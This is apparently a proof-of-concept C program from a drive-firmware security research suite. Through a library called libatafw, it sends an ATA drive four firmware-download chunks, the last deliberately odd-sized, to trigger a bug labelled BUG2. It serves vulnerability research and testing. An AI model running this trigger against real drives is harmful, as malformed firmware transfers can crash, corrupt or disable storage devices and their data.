#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <libatafw/libatafw.h>
#include "common.h"

#define BUG2_INTERMEDIATE_BUFFER_SIZE					(0x200 * LIBATAFW_SECTOR_SIZE)
#define BUG2_LAST_BUFFER_SIZE							(0x207 * LIBATAFW_SECTOR_SIZE)

static struct ata_fw_chunk chunks[] = {
	{
		.offset = 0,
		.chunk_data = NULL,
		.chunk_size = BUG2_INTERMEDIATE_BUFFER_SIZE
	},
	{
		.offset = BUG2_INTERMEDIATE_BUFFER_SIZE,
		.chunk_data = NULL,
		.chunk_size = BUG2_INTERMEDIATE_BUFFER_SIZE
	},
	{
		.offset = BUG2_INTERMEDIATE_BUFFER_SIZE * 2,
		.chunk_data = NULL,
		.chunk_size = BUG2_INTERMEDIATE_BUFFER_SIZE
	},
	{
		.offset = BUG2_INTERMEDIATE_BUFFER_SIZE * 3,
		.chunk_data = NULL,
		.chunk_size = BUG2_LAST_BUFFER_SIZE
	},
};

void print_buffer(const uint8_t *buffer, uint32_t buffer_size)
{
	uint32_t i = 0;

	for (i = 0; i < buffer_size; i++) {
		printf("%02x\n", buffer[i]);
	}
}

int main(int argc, char *argv[])
{
	int main_ret = MAIN_RESULT_FAILURE;
	enum ata_fw_error status = ATA_FW_ERR_UNINITIALIZED;
	uint8_t sense_buffer[LIBATAFW_SENSE_BUFFER_LENGTH];

	if (NUM_MAIN_ARGS != argc) {
		printf("Usage: %s <device path>\n", argv[0]);
		goto l_cleanup;
	}

	memset(sense_buffer, 0, sizeof(sense_buffer));

	status = libatafw__init(argv[1]);
	if (ATA_FW_ERR_SUCCESS != status) {
		printf("Error: could not initialize libatafw. Initialization returned: %d\n", status);
		goto l_cleanup;
	}

	status = libatafw__enqueue_multiple_firmware_chunks(chunks, sizeof(chunks) / sizeof(chunks[0]));
	if (ATA_FW_ERR_SUCCESS != status) {
		printf("Error: could not enqueue at least one firmware chunk. libatafw returned: %d\n", status);
		goto l_cleanup;
	}

	status = libatafw__execute_requests(true, NULL, sense_buffer);
	if (ATA_FW_ERR_SUCCESS != status) {
		printf("Error: an error encountered while executing the request. libatafw status: %d\n", status);
		print_buffer(sense_buffer, sizeof(sense_buffer));
		goto l_cleanup;
	}

	main_ret = MAIN_RESULT_SUCCESS;
l_cleanup:

	libatafw__deinit();

	return main_ret;
}
